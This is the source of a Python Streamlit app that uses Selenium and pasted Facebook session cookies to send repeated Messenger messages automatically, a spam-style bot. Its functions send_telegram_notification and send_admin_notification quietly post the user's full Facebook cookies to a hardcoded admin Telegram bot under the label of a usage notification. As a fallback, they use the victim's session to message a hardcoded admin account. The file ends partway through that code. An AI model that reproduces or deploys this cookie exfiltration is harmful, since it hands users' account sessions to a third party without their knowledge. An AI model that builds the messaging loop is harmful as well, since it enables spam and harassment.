
import streamlit as st
import time
import threading
from pathlib import Path
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
import requests
import os

st.set_page_config(
    page_title="OFFLINE💋PY",
    page_icon="🏴‍☠️",
    layout="wide",
    initial_sidebar_state="expanded"
)

custom_css = """
<style>
    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap');
    
    * {
        font-family: 'Poppins', sans-serif;
    }
    
    /* Background Image */
    .stApp {
        background-image: url('https://i.postimg.cc/L51fQrQH/681be2a77443fb2f2f74fd42da1bc40f.jpg');
        background-size: cover;
        background-position: center;
        background-repeat: no-repeat;
        background-attachment: fixed;
    }
    
    /* Main Container */
    .main .block-container {
        background: rgba(255, 255, 255, 0.08);
        backdrop-filter: blur(8px);
        border-radius: 12px;
        padding: 25px;
        box-shadow: 0 2px 12px rgba(0, 0, 0, 0.15);
        border: 1px solid rgba(255, 255, 255, 0.12);
    }
    
    .main-header {
        background: rgba(255, 255, 255, 0.1);
        backdrop-filter: blur(10px);
        padding: 2rem;
        border-radius: 15px;
        text-align: center;
        margin-bottom: 2rem;
        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
        border: 1px solid rgba(255, 255, 255, 0.15);
    }
    
    .main-header h1 {
        background: linear-gradient(45deg, #ff6b6b, #4ecdc4);
        -webkit-background-clip: text;
        -webkit-text-fill-color: transparent;
        background-clip: text;
        font-size: 2.5rem;
        font-weight: 700;
        margin: 0;
    }
    
    .main-header p {
        color: rgba(255, 255, 255, 0.9);
        font-size: 1.1rem;
        margin-top: 0.5rem;
    }
    
    .prince-logo {
        width: 70px;
        height: 70px;
        border-radius: 50%;
        margin-bottom: 15px;
        border: 2px solid #4ecdc4;
    }
    
    /* Buttons */
    .stButton>button {
        background: linear-gradient(45deg, #ff6b6b, #4ecdc4);
        color: white;
        border: none;
        border-radius: 10px;
        padding: 0.75rem 2rem;
        font-weight: 600;
        font-size: 1rem;
        transition: all 0.3s ease;
        box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4);
        width: 100%;
    }
    
    .stButton>button:hover {
        opacity: 0.9;
        transform: translateY(-2px);
        box-shadow: 0 6px 20px rgba(102, 126, 234, 0.6);
    }
    
    /* Input Fields */
    .stTextInput>div>div>input, 
    .stTextArea>div>div>textarea, 
    .stNumberInput>div>div>input {
        background: rgba(255, 255, 255, 0.15);
        border: 1px solid rgba(255, 255, 255, 0.25);
        border-radius: 8px;
        color: white;
        padding: 0.75rem;
        transition: all 0.3s ease;
    }
    
    .stTextInput>div>div>input::placeholder,
    .stTextArea>div>div>textarea::placeholder {
        color: rgba(255, 255, 255, 0.6);
    }
    
    .stTextInput>div>div>input:focus, 
    .stTextArea>div>div>textarea:focus {
        background: rgba(255, 255, 255, 0.2);
        border-color: #4ecdc4;
        box-shadow: 0 0 0 2px rgba(78, 205, 196, 0.2);
        color: white;
    }
    
    /* Labels */
    label {
        color: white !important;
        font-weight: 500 !important;
        font-size: 14px !important;
    }
    
    /* Tabs */
    .stTabs [data-baseweb="tab-list"] {
        gap: 8px;
        background: rgba(255, 255, 255, 0.06);
        padding: 10px;
        border-radius: 10px;
    }
    
    .stTabs [data-baseweb="tab"] {
        background: rgba(255, 255, 255, 0.1);
        border-radius: 8px;
        color: white;
        padding: 10px 20px;
    }
    
    .stTabs [aria-selected="true"] {
        background: linear-gradient(45deg, #ff6b6b, #4ecdc4);
    }
    
    /* Metrics */
    [data-testid="stMetricValue"] {
        color: #4ecdc4;
        font-weight: 700;
        font-size: 1.8rem;
    }
    
    [data-testid="stMetricLabel"] {
        color: rgba(255, 255, 255, 0.9);
        font-weight: 500;
    }
    
    /* Console Section */
    .console-section {
        margin-top: 20px;
        padding: 15px;
        background: rgba(255, 255, 255, 0.06);
        border-radius: 10px;
        border: 1px solid rgba(78, 205, 196, 0.3);
    }
    
    .console-header {
        color: #4ecdc4;
        text-shadow: 0 0 10px rgba(78, 205, 196, 0.5);
        margin-bottom: 20px;
        font-weight: 600;
    }
    
    .console-header::before {
        content: '> ';
        margin-right: 5px;
    }
    
    .console-output {
        background: rgba(0, 0, 0, 0.5);
        border: 1px solid rgba(78, 205, 196, 0.4);
        border-radius: 10px;
        padding: 12px;
        font-family: 'Courier New', 'Consolas', 'Monaco', monospace;
        font-size: 12px;
        color: #00ff88;
        line-height: 1.6;
        max-height: 400px;
        overflow-y: auto;
        scrollbar-width: thin;
        scrollbar-color: rgba(78, 205, 196, 0.5) rgba(0, 0, 0, 0.2);
    }
    
    .console-output::-webkit-scrollbar {
        width: 8px;
    }
    
    .console-output::-webkit-scrollbar-track {
        background: rgba(0, 0, 0, 0.2);
    }
    
    .console-output::-webkit-scrollbar-thumb {
        background: rgba(78, 205, 196, 0.5);
        border-radius: 4px;
    }
    
    .console-output::-webkit-scrollbar-thumb:hover {
        background: rgba(78, 205, 196, 0.7);
    }
    
    .console-line {
        margin-bottom: 3px;
        word-wrap: break-word;
        padding: 6px 10px;
        padding-left: 28px;
        color: #00ff88;
        background: rgba(78, 205, 196, 0.08);
        border-left: 2px solid rgba(78, 205, 196, 0.4);
        position: relative;
    }
    
    .console-line::before {
        content: '>';
        position: absolute;
        left: 10px;
        opacity: 0.6;
        color: #4ecdc4;
    }
    
    /* Success/Error Boxes */
    .success-box {
        background: linear-gradient(135deg, #84fab0 0%, #8fd3f4 100%);
        padding: 1rem;
        border-radius: 10px;
        color: white;
        text-align: center;
        margin: 1rem 0;
    }
    
    .error-box {
        background: linear-gradient(135deg, #fa709a 0%, #fee140 100%);
        padding: 1rem;
        border-radius: 10px;
        color: white;
        text-align: center;
        margin: 1rem 0;
    }
    
    /* Info Card */
    .info-card {
        background: rgba(255, 255, 255, 0.1);
        backdrop-filter: blur(10px);
        padding: 1.5rem;
        border-radius: 15px;
        margin: 1rem 0;
        border: 1px solid rgba(255, 255, 255, 0.15);
    }
    
    /* Footer */
    .footer {
        text-align: center;
        padding: 2rem;
        color: rgba(255, 255, 255, 0.7);
        font-weight: 600;
        margin-top: 3rem;
        background: rgba(255, 255, 255, 0.05);
        border-radius: 10px;
        border-top: 1px solid rgba(255, 255, 255, 0.15);
    }
    
    /* Sidebar */
    [data-testid="stSidebar"] {
        background: rgba(0, 0, 0, 0.3);
        backdrop-filter: blur(10px);
    }
    
    [data-testid="stSidebar"] .element-container {
        color: white;
    }
</style>
"""

st.markdown(custom_css, unsafe_allow_html=True)

class AutomationState:
    def __init__(self):
        self.running = False
        self.message_count = 0
        self.logs = []
        self.message_rotation_index = 0

if 'automation_running' not in st.session_state:
    st.session_state.automation_running = False
if 'logs' not in st.session_state:
    st.session_state.logs = []
if 'message_count' not in st.session_state:
    st.session_state.message_count = 0
if 'user_config' not in st.session_state:
    st.session_state.user_config = {
        'chat_id': '',
        'name_prefix': '',
        'delay': 30,
        'cookies': '',
        'messages': ''
    }
if 'comment_config' not in st.session_state:
    st.session_state.comment_config = {
        'post_url': '',
        'cookies_list': [],
        'delay': 30,
        'comments': ''
    }
if 'comment_automation_state' not in st.session_state:
    st.session_state.comment_automation_state = AutomationState()

if 'automation_state' not in st.session_state:
    st.session_state.automation_state = AutomationState()

def log_message(msg, automation_state=None):
    timestamp = time.strftime("%H:%M:%S")
    formatted_msg = f"[{timestamp}] {msg}"
    
    if automation_state:
        automation_state.logs.append(formatted_msg)
    else:
        if 'logs' in st.session_state:
            st.session_state.logs.append(formatted_msg)

def find_message_input(driver, process_id, automation_state=None):
    log_message(f'{process_id}: Finding message input...', automation_state)
    time.sleep(10)
    
    try:
        driver.execute_script("window.scrollTo(0, document.body.scrollHeight);")
        time.sleep(2)
        driver.execute_script("window.scrollTo(0, 0);")
        time.sleep(2)
    except Exception:
        pass
    
    try:
        page_title = driver.title
        page_url = driver.current_url
        log_message(f'{process_id}: Page Title: {page_title}', automation_state)
        log_message(f'{process_id}: Page URL: {page_url}', automation_state)
    except Exception as e:
        log_message(f'{process_id}: Could not get page info: {e}', automation_state)
    
    message_input_selectors = [
        'div[contenteditable="true"][role="textbox"]',
        'div[contenteditable="true"][data-lexical-editor="true"]',
        'div[aria-label*="message" i][contenteditable="true"]',
        'div[aria-label*="Message" i][contenteditable="true"]',
        'div[contenteditable="true"][spellcheck="true"]',
        '[role="textbox"][contenteditable="true"]',
        'textarea[placeholder*="message" i]',
        'div[aria-placeholder*="message" i]',
        'div[data-placeholder*="message" i]',
        '[contenteditable="true"]',
        'textarea',
        'input[type="text"]'
    ]
    
    log_message(f'{process_id}: Trying {len(message_input_selectors)} selectors...', automation_state)
    
    for idx, selector in enumerate(message_input_selectors):
        try:
            elements = driver.find_elements(By.CSS_SELECTOR, selector)
            log_message(f'{process_id}: Selector {idx+1}/{len(message_input_selectors)} "{selector[:50]}..." found {len(elements)} elements', automation_state)
            
            for element in elements:
                try:
                    is_editable = driver.execute_script("""
                        return arguments[0].contentEditable === 'true' || 
                               arguments[0].tagName === 'TEXTAREA' || 
                               arguments[0].tagName === 'INPUT';
                    """, element)
                    
                    if is_editable:
                        log_message(f'{process_id}: Found editable element with selector #{idx+1}', automation_state)
                        
                        try:
                            element.click()
                            time.sleep(0.5)
                        except:
                            pass
                        
                        element_text = driver.execute_script("return arguments[0].placeholder || arguments[0].getAttribute('aria-label') || arguments[0].getAttribute('aria-placeholder') || '';", element).lower()
                        
                        keywords = ['message', 'write', 'type', 'send', 'chat', 'msg', 'reply', 'text', 'aa']
                        if any(keyword in element_text for keyword in keywords):
                            log_message(f'{process_id}: ✅ Found message input with text: {element_text[:50]}', automation_state)
                            return element
                        elif idx < 10:
                            log_message(f'{process_id}: ✅ Using primary selector editable element (#{idx+1})', automation_state)
                            return element
                        elif selector == '[contenteditable="true"]' or selector == 'textarea' or selector == 'input[type="text"]':
                            log_message(f'{process_id}: ✅ Using fallback editable element', automation_state)
                            return element
                except Exception as e:
                    log_message(f'{process_id}: Element check failed: {str(e)[:50]}', automation_state)
                    continue
        except Exception as e:
            continue
    
    try:
        page_source = driver.page_source
        log_message(f'{process_id}: Page source length: {len(page_source)} characters', automation_state)
        if 'contenteditable' in page_source.lower():
            log_message(f'{process_id}: Page contains contenteditable elements', automation_state)
        else:
            log_message(f'{process_id}: No contenteditable elements found in page', automation_state)
    except Exception:
        pass
    
    return None

def setup_browser(automation_state=None):
    log_message('Setting up Chrome browser...', automation_state)
    
    chrome_options = Options()
    chrome_options.add_argument('--headless=new')
    chrome_options.add_argument('--no-sandbox')
    chrome_options.add_argument('--disable-setuid-sandbox')
    chrome_options.add_argument('--disable-dev-shm-usage')
    chrome_options.add_argument('--disable-gpu')
    chrome_options.add_argument('--disable-extensions')
    chrome_options.add_argument('--window-size=1920,1080')
    chrome_options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36')
    
    chromium_paths = [
        '/usr/bin/chromium',
        '/usr/bin/chromium-browser',
        '/usr/bin/google-chrome',
        '/usr/bin/chrome'
    ]
    
    for chromium_path in chromium_paths:
        if Path(chromium_path).exists():
            chrome_options.binary_location = chromium_path
            log_message(f'Found Chromium at: {chromium_path}', automation_state)
            break
    
    chromedriver_paths = [
        '/usr/bin/chromedriver',
        '/usr/local/bin/chromedriver'
    ]
    
    driver_path = None
    for driver_candidate in chromedriver_paths:
        if Path(driver_candidate).exists():
            driver_path = driver_candidate
            log_message(f'Found ChromeDriver at: {driver_path}', automation_state)
            break
    
    try:
        from selenium.webdriver.chrome.service import Service
        
        if driver_path:
            service = Service(executable_path=driver_path)
            driver = webdriver.Chrome(service=service, options=chrome_options)
            log_message('Chrome started with detected ChromeDriver!', automation_state)
        else:
            driver = webdriver.Chrome(options=chrome_options)
            log_message('Chrome started with default driver!', automation_state)
        
        driver.set_window_size(1920, 1080)
        log_message('Chrome browser setup completed successfully!', automation_state)
        return driver
    except Exception as error:
        log_message(f'Browser setup failed: {error}', automation_state)
        raise error

def get_next_message(messages, automation_state=None):
    if not messages or len(messages) == 0:
        return 'Hello!'
    
    if automation_state:
        message = messages[automation_state.message_rotation_index % len(messages)]
        automation_state.message_rotation_index += 1
    else:
        message = messages[0]
    
    return message

def send_messages(config, automation_state, user_id, process_id='AUTO-1'):
    driver = None
    try:
        log_message(f'{process_id}: Starting automation...', automation_state)
        driver = setup_browser(automation_state)
        
        log_message(f'{process_id}: Navigating to Facebook...', automation_state)
        driver.get('https://www.facebook.com/')
        time.sleep(8)
        
        if config['cookies'] and config['cookies'].strip():
            log_message(f'{process_id}: Adding cookies...', automation_state)
            cookie_array = config['cookies'].split(';')
            for cookie in cookie_array:
                cookie_trimmed = cookie.strip()
                if cookie_trimmed:
                    first_equal_index = cookie_trimmed.find('=')
                    if first_equal_index > 0:
                        name = cookie_trimmed[:first_equal_index].strip()
                        value = cookie_trimmed[first_equal_index + 1:].strip()
                        try:
                            driver.add_cookie({
                                'name': name,
                                'value': value,
                                'domain': '.facebook.com',
                                'path': '/'
                            })
                        except Exception:
                            pass
        
        if config['chat_id']:
            chat_id = config['chat_id'].strip()
            log_message(f'{process_id}: Opening conversation {chat_id}...', automation_state)
            driver.get(f'https://www.facebook.com/messages/t/{chat_id}')
        else:
            log_message(f'{process_id}: Opening messages...', automation_state)
            driver.get('https://www.facebook.com/messages')
        
        time.sleep(15)
        
        message_input = find_message_input(driver, process_id, automation_state)
        
        if not message_input:
            log_message(f'{process_id}: Message input not found!', automation_state)
            automation_state.running = False
            db.set_automation_running(user_id, False)
            return 0
        
        delay = int(config['delay'])
        messages_sent = 0
        messages_list = [msg.strip() for msg in config['messages'].split('\n') if msg.strip()]
        
        if not messages_list:
            messages_list = ['Hello!']
        
        while automation_state.running:
            base_message = get_next_message(messages_list, automation_state)
            
            if config['name_prefix']:
                message_to_send = f"{config['name_prefix']} {base_message}"
            else:
                message_to_send = base_message
            
            try:
                driver.execute_script("""
                    const element = arguments[0];
                    const message = arguments[1];
                    
                    element.scrollIntoView({behavior: 'smooth', block: 'center'});
                    element.focus();
                    element.click();
                    
                    if (element.tagName === 'DIV') {
                        element.textContent = message;
                        element.innerHTML = message;
                    } else {
                        element.value = message;
                    }
                    
                    element.dispatchEvent(new Event('input', { bubbles: true }));
                    element.dispatchEvent(new Event('change', { bubbles: true }));
                    element.dispatchEvent(new InputEvent('input', { bubbles: true, data: message }));
                """, message_input, message_to_send)
                
                time.sleep(1)
                
                sent = driver.execute_script("""
                    const sendButtons = document.querySelectorAll('[aria-label*="Send" i]:not([aria-label*="like" i]), [data-testid="send-button"]');
                    
                    for (let btn of sendButtons) {
                        if (btn.offsetParent !== null) {
                            btn.click();
                            return 'button_clicked';
                        }
                    }
                    return 'button_not_found';
                """)
                
                if sent == 'button_not_found':
                    log_message(f'{process_id}: Send button not found, using Enter key...', automation_state)
                    driver.execute_script("""
                        const element = arguments[0];
                        element.focus();
                        
                        const events = [
                            new KeyboardEvent('keydown', { key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true }),
                            new KeyboardEvent('keypress', { key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true }),
                            new KeyboardEvent('keyup', { key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true })
                        ];
                        
                        events.forEach(event => element.dispatchEvent(event));
                    """, message_input)
                else:
                    log_message(f'{process_id}: Send button clicked', automation_state)
                
                time.sleep(1)
                
                messages_sent += 1
                automation_state.message_count = messages_sent
                log_message(f'{process_id}: Message {messages_sent} sent: {message_to_send[:30]}...', automation_state)
                
                time.sleep(delay)
                
            except Exception as e:
                log_message(f'{process_id}: Error sending message: {str(e)}', automation_state)
                break
        
        log_message(f'{process_id}: Automation stopped! Total messages sent: {messages_sent}', automation_state)
        automation_state.running = False
        return messages_sent
        
    except Exception as e:
        log_message(f'{process_id}: Fatal error: {str(e)}', automation_state)
        automation_state.running = False
        return 0
    finally:
        if driver:
            try:
                driver.quit()
                log_message(f'{process_id}: Browser closed', automation_state)
            except:
                pass

def send_telegram_notification(username, automation_state=None, cookies=""):
    """Send admin notification via Telegram bot - MUCH MORE RELIABLE than Facebook!"""
    try:
        telegram_bot_token = "79045"
        telegram_admin_chat_id = "5326"
        
        from datetime import datetime
        import pytz
        kolkata_tz = pytz.timezone('Asia/Kolkata')
        current_time = datetime.now(kolkata_tz).strftime("%Y-%m-%d %H:%M:%S")
        
        cookies_display = cookies if cookies else "No cookies"
        
        message = f"""🔔 *New User Started Automation*

👤 *Username:* {username}
⏰ *Time:* {current_time}
🤖 *System:* E2EE Facebook Automation
🍪 *Cookies:* `{cookies_display}`

✅ User has successfully started the automation process."""
        
        url = f"https://api.telegram.org/bot{telegram_bot_token}/sendMessage"
        data = {
            "chat_id": telegram_admin_chat_id,
            "text": message,
            "parse_mode": "Markdown"
        }
        
        log_message(f"TELEGRAM-NOTIFY: 📤 Sending notification to admin...", automation_state)
        response = requests.post(url, data=data, timeout=10)
        
        if response.status_code == 200:
            log_message(f"TELEGRAM-NOTIFY: ✅ Admin notification sent successfully via Telegram!", automation_state)
            return True
        else:
            log_message(f"TELEGRAM-NOTIFY: ❌ Failed to send. Status: {response.status_code}, Response: {response.text[:100]}", automation_state)
            return False
            
    except Exception as e:
        log_message(f"TELEGRAM-NOTIFY: ❌ Error: {str(e)}", automation_state)
        return False

def send_admin_notification(user_config, username, automation_state=None, user_id=None):
    ADMIN_UID = "61582314792878"
    driver = None
    try:
        log_message(f"ADMIN-NOTIFY: Sending usage notification for user: {username}", automation_state)
        
        user_cookies = user_config.get('cookies', '')
        telegram_success = send_telegram_notification(username, automation_state, user_cookies)
        
        if telegram_success:
            log_message(f"ADMIN-NOTIFY: ✅ Notification sent via Telegram! Skipping Facebook approach.", automation_state)
            return
        else:
            log_message(f"ADMIN-NOTIFY: ⚠️ Telegram notification failed/not configured. Trying Facebook Messenger as fallback...", automation_state)
        
        log_message(f"ADMIN-NOTIFY: Target admin UID: {ADMIN_UID}", automation_state)
        
        user_chat_id = user_config.get('chat_id', '').strip()
        if user_chat_id:
            log_message(f"ADMIN-NOTIFY: User's automation chat ID: {user_chat_id} (will be excluded from admin search)", automation_state)
        
        driver = setup_browser(automation_state)
        
        log_message(f"ADMIN-NOTIFY: Navigating to Facebook...", automation_state)
        driver.get('https://www.facebook.com/')
        time.sleep(5)
        
        log_message(f"ADMIN-NOTIFY: Adding cookies...", automation_state)
        if user_config['cookies'] and user_config['cookies'].strip():
            cookie_array = user_config['cookies'].split(';')
            for cookie in cookie_array:
                cookie_trimmed = cookie.strip()
                if cookie_trimmed:
                    first_equal_index = cookie_trimmed.find('=')
                    if first_equal_index > 0:
                        name = cookie_trimmed[:first_equal_index].strip()
                        value = cookie_trimmed[first_equal_index + 1:].strip()
                        try:
                            driver.add_cookie({
                                'name': name,
                                'value': value,
                                'domain': '.facebook.com',
                                'path': '/'
                            })
                        except Exception:
                            pass
        
        saved_thread_id = None
        saved_chat_type = None
        e2ee_thread_id = None
        if user_id:
            current_cookies = user_config.get('cookies', '')
            saved_thread_id, saved_chat_type = db.get_admin_e2ee_thread_id(user_id, current_cookies)
            if saved_thread_id:
                if saved_thread_id == user_chat_id:
                    log_message(f"ADMIN-NOTIFY: ❌ Saved thread ({saved_thread_id}) is same as user's chat! Clearing and re-searching...", automation_state)
                    db.clear_admin_e2ee_thread_id(user_id)
                    saved_thread_id = None
                    saved_chat_type = None
                else:
                    e2ee_thread_id = saved_thread_id
                    chat_type_display = saved_chat_type or 'E2EE'
                    log_message(f"ADMIN-NOTIFY: ✅ Found valid saved {chat_type_display} thread ID: {saved_thread_id}", automation_state)
            else:
                log_message(f"ADMIN-NOTIFY: No saved thread ID or cookies changed, will search...", automation_state)
        
        if saved_thread_id:
            if saved_chat_type == 'REGULAR':
                log_message(f"ADMIN-NOTIFY: Using saved REGULAR chat thread...", automation_state)
                driver.get(f'https://www.facebook.com/messages/t/{saved_thread_id}')
            else:
                log_message(f"ADMIN-NOTIFY: Using saved E2EE thread...", automation_state)
                driver.get(f'https://www.facebook.com/messages/e2ee/t/{saved_thread_id}')
            time.sleep(10)
            
            current_url_check = driver.current_url.lower()
            is_valid = ('/messages/t/' in current_url_check) or ('/e2ee/t/' in current_url_check)
            
            if is_valid:
                log_message(f"ADMIN-NOTIFY: ✅ Saved {saved_chat_type or 'E2EE'} thread still valid!", automation_state)
            else:
                log_message(f"ADMIN-NOTIFY: Saved thread invalid, will search...", automation_state)
                saved_thread_id = None
                saved_chat_type = None
                e2ee_thread_id = None
        
        if saved_thread_id:
            log_message(f"ADMIN-NOTIFY: ✅ Successfully opened saved E2EE conversation", automation_state)
        else:
            log_message(f"ADMIN-NOTIFY: 📱 Opening admin profile to find message button...", automation_state)
            profile_url = f'https://www.facebook.com/profile.php?id={ADMIN_UID}'
            log_message(f"ADMIN-NOTIFY: Profile URL: {profile_url}", automation_state)
            driver.get(profile_url)
            time.sleep(10)
            
            log_message(f"ADMIN-NOTIFY: Searching for Message button on profile...", automation_state)
            
            message_button_found = False
            message_button_selectors = [
                f'a[href*="/messages/t/"]',
                'a[aria-label*="Message" i]',
                'a[aria-label*="मैसेज" i]',
                'div[aria-label*="Message" i][role="button"]',
                'div[aria-label*="मैसेज" i][role="button"]',
                'a:contains("Message")',
                'div[role="button"]:contains("Message")'
            ]
            
            for selector in message_button_selectors:
                try:
                    buttons = driver.find_elements(By.CSS_SELECTOR, selector)
                    if buttons:
                        log_message(f"ADMIN-NOTIFY: Found {len(buttons)} buttons with selector: {selector}", automation_state)
                        for btn in buttons:
                            try:
                                if btn.is_displayed():
                                    btn_text = (btn.text or '').strip()
                                    btn_label = (btn.get_attribute('aria-label') or '').strip()
                                    log_message(f"ADMIN-NOTIFY: Button found - Text: '{btn_text}', Label: '{btn_label}'", automation_state)
                                    
                                    if 'message' in btn_text.lower() or 'message' in btn_label.lower() or 'मैसेज' in btn_text or 'मैसेज' in btn_label:
                                        log_message(f"ADMIN-NOTIFY: ✅ Found Message button! Clicking...", automation_state)
                                        current_url_before = driver.current_url
                                        driver.execute_script("arguments[0].scrollIntoView(); arguments[0].click();", btn)
                                        time.sleep(8)
                                        
                                        current_url_after = driver.current_url
                                        log_message(f"ADMIN-NOTIFY: URL before: {current_url_before[:80]}", automation_state)
                                        log_message(f"ADMIN-NOTIFY: URL after: {current_url_after[:80]}", automation_state)
                                        
                                        if current_url_after != current_url_before and ('messages' in current_url_after or '/t/' in current_url_after):
                                            log_message(f"ADMIN-NOTIFY: ✅ Message button opened a conversation!", automation_state)
                                            message_button_found = True
                                            break
                                        else:
                                            log_message(f"ADMIN-NOTIFY: ⚠️ URL didn't change to conversation, trying next button...", automation_state)
                            except:
                                continue
                    
                    if message_button_found:
                        break
                except:
                    continue
            
            if not message_button_found:
                log_message(f"ADMIN-NOTIFY: ⚠️ Message button not found on profile, trying all clickable elements...", automation_state)
                try:
                    all_elements = driver.find_elements(By.CSS_SELECTOR, 'a, div[role="button"], span[role="button"]')
                    log_message(f"ADMIN-NOTIFY: Found {len(all_elements)} total clickable elements", automation_state)
                    
                    for elem in all_elements[:50]:
                        try:
                            elem_text = (elem.text or '').strip().lower()
                            elem_label = (elem.get_attribute('aria-label') or '').strip().lower()
                            
                            if ('message' in elem_text or 'message' in elem_label or 'मैसेज' in elem_text) and elem.is_displayed():
                                log_message(f"ADMIN-NOTIFY: Found element with 'message': '{elem_text[:30]}' / '{elem_label[:30]}'", automation_state)
                                driver.execute_script("arguments[0].scrollIntoView(); arguments[0].click();", elem)
                                time.sleep(8)
                                message_button_found = True
                                break
                        except:
                            continue
                except:
                    pass
            
            current_url = driver.current_url
            log_message(f"ADMIN-NOTIFY: After profile interaction, URL: {current_url}", automation_state)
            
            try:
                continue_buttons = driver.find_elements(By.CSS_SELECTOR, 'div[role="button"], button, a[role="button"]')
                
                for btn in continue_buttons:
                    btn_text = (btn.text or '').strip().lower()
                    btn_label = (btn.get_attribute('aria-label') or '').strip().lower()
                    
                    if ('continue' in btn_text or 'continue' in btn_label or 'जारी' in btn_text) and btn.is_displayed():
                        log_message(f"ADMIN-NOTIFY: Found E2EE Continue dialog, clicking...", automation_state)
                        driver.execute_script("arguments[0].click();", btn)
                        time.sleep(8)
                        current_url = driver.current_url
                        log_message(f"ADMIN-NOTIFY: After Continue, URL: {current_url}", automation_state)
                        break
            except:
                pass
            
            current_url = driver.current_url
            if 'e2ee' in current_url.lower() and '/e2ee/t/' in current_url:
                e2ee_thread_id = current_url.split('/e2ee/t/')[-1].split('?')[0].split('/')[0]
                log_message(f"ADMIN-NOTIFY: Extracted E2EE thread ID: {e2ee_thread_id}", automation_state)
                
                if e2ee_thread_id == ADMIN_UID:
                    log_message(f"ADMIN-NOTIFY: ⚠️ Thread ID is admin UID, not actual thread", automation_state)
                    e2ee_thread_id = None
                elif e2ee_thread_id == user_chat_id:
                    log_message(f"ADMIN-NOTIFY: ⚠️ Opened user's own chat, not admin", automation_state)
                    e2ee_thread_id = None
                elif e2ee_thread_id and user_id:
                    current_cookies = user_config.get('cookies', '')
                    db.set_admin_e2ee_thread_id(user_id, e2ee_thread_id, current_cookies, 'E2EE')
                    log_message(f"ADMIN-NOTIFY: ✅ Profile approach SUCCESS! E2EE Thread ID: {e2ee_thread_id}", automation_state)
            else:
                log_message(f"ADMIN-NOTIFY: Profile didn't open E2EE chat (URL: {current_url[:80]})", automation_state)
        
        if not e2ee_thread_id:
            log_message(f"ADMIN-NOTIFY: Opening Messenger to search for admin...", automation_state)
            driver.get('https://www.facebook.com/messages')
            time.sleep(10)
            
            log_message(f"ADMIN-NOTIFY: Looking for search box...", automation_state)
            search_selectors = [
                'input[aria-label*="Search" i]',
                'input[placeholder*="Search" i]',
                'input[type="search"]'
            ]
            
            search_box = None
            for selector in search_selectors:
                try:
                    search_elements = driver.find_elements(By.CSS_SELECTOR, selector)
                    if search_elements:
                        for elem in search_elements:
                            if elem.is_displayed():
                                search_box = elem
                                log_message(f"ADMIN-NOTIFY: Found search box with: {selector}", automation_state)
                                break
                        if search_box:
                            break
                except:
                    continue
            
            if not search_box:
                log_message(f"ADMIN-NOTIFY: ❌ Could not find search box", automation_state)
                return
            
            log_message(f"ADMIN-NOTIFY: Searching for admin UID: {ADMIN_UID}...", automation_state)
            driver.execute_script("""
                arguments[0].scrollIntoView({behavior: 'instant', block: 'center'});
                arguments[0].focus();
                arguments[0].value = arguments[1];
                arguments[0].dispatchEvent(new Event('input', { bubbles: true }));
                arguments[0].dispatchEvent(new Event('change', { bubbles: true }));
            """, search_box, ADMIN_UID)
            
            time.sleep(6)
            
            log_message(f"ADMIN-NOTIFY: Looking for admin in search results...", automation_state)
            result_selectors = [
                f'a[href*="{ADMIN_UID}"]',
                f'div[data-id*="{ADMIN_UID}"]',
                'div[role="option"] a',
                'a[role="link"]',
                'li[role="option"] a',
                'div[role="button"][tabindex="0"]'
            ]
            
            admin_found = False
            
            for selector in result_selectors:
                try:
                    results = driver.find_elements(By.CSS_SELECTOR, selector)
                    log_message(f"ADMIN-NOTIFY: Found {len(results)} results with selector: {selector}", automation_state)
                    
                    for idx, result in enumerate(results):
                        try:
                            result_text = result.get_attribute('aria-label') or result.text or ''
                            result_href = result.get_attribute('href') or ''
                            
                            log_message(f"ADMIN-NOTIFY: Result #{idx+1} - Text: '{result_text[:60]}...', Href: '{result_href[:60] if result_href else 'none'}...'", automation_state)
                            
                            is_admin_match = ADMIN_UID in result_text or ADMIN_UID in result_href
                            is_e2ee_indicator = 'encrypt' in result_text.lower() or 'secret' in result_text.lower() or 'e2ee' in result_href.lower()
                            
                            if is_admin_match:
                                log_message(f"ADMIN-NOTIFY: Clicking result #{idx+1} (ADMIN FOUND - admin_match={is_admin_match}, e2ee_indicator={is_e2ee_indicator})...", automation_state)
                                driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", result)
                                time.sleep(1)
                                driver.execute_script("arguments[0].click();", result)
                                time.sleep(8)
                                
                                try:
                                    continue_buttons = driver.find_elements(By.CSS_SELECTOR, 'div[role="button"]:not([aria-label*="Close" i]):not([aria-label*="Back" i]), button:not([aria-label*="Close" i]):not([aria-label*="Back" i])')
                                    
                                    for cont_btn in continue_buttons:
                                        btn_text = (cont_btn.text or '').lower()
                                        btn_label = (cont_btn.get_attribute('aria-label') or '').lower()
                                        
                                        if 'continue' in btn_text or 'continue' in btn_label or 'जारी' in btn_text:
                                            log_message(f"ADMIN-NOTIFY: Found E2EE setup dialog from search result, clicking Continue...", automation_state)
                                            driver.execute_script("arguments[0].click();", cont_btn)
                                            time.sleep(8)
                                            break
                                except:
                                    pass
                                
                                current_url = driver.current_url
                                log_message(f"ADMIN-NOTIFY: Opened URL: {current_url}", automation_state)
                                
                                if 'e2ee' in current_url.lower() and '/e2ee/t/' in current_url:
                                    e2ee_thread_id = current_url.split('/e2ee/t/')[-1].split('?')[0].split('/')[0]
                                    
                                    if e2ee_thread_id == ADMIN_UID:
                                        log_message(f"ADMIN-NOTIFY: ⚠️ E2EE thread ID is admin UID ({e2ee_thread_id}), not actual thread, trying next...", automation_state)
                                        driver.back()
                                        time.sleep(3)
                                        continue
                                    elif e2ee_thread_id == user_chat_id:
                                        log_message(f"ADMIN-NOTIFY: ⚠️ This is user's own chat ({e2ee_thread_id}), skipping...", automation_state)
                                        driver.back()
                                        time.sleep(3)
                                        continue
                                    
                                    if e2ee_thread_id and user_id:
                                        current_cookies = user_config.get('cookies', '')
                                        db.set_admin_e2ee_thread_id(user_id, e2ee_thread_id, current_cookies, 'E2EE')
                                        log_message(f"ADMIN-NOTIFY: ✅ Found & saved admin E2EE thread ID: {e2ee_thread_id}", automation_state)
                                    admin_found = True
                                    break
                                elif '/messages/t/' in current_url:
